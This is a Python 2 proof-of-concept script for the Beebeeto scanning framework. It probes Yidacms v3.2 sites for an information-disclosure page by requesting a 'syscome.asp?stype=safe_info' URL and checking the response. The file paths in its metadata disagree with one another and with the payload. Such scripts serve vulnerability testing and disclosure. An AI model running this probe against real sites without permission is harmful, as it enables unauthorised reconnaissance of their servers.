#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0172',
            'name': 'Yidacms v3.2 /Yidacms/user/user.asp 信息泄漏漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-04',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Yidacms',
            'vul_version': ['3.2'],
            'type': 'Information Disclosure',
            'tag': ['Yidacms漏洞', '敏感信息泄漏', '/Yidacms/user/user.asp', 'asp'],
            'desc': '漏洞文件：/Yidacms/admin/admin_syscome.asp',
            'references': ['http://wooyun.org/bugs/wooyun-2014-074065',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/yidawap/syscome.asp?stype=safe_info'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '服务器相对不安全的组件检测' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())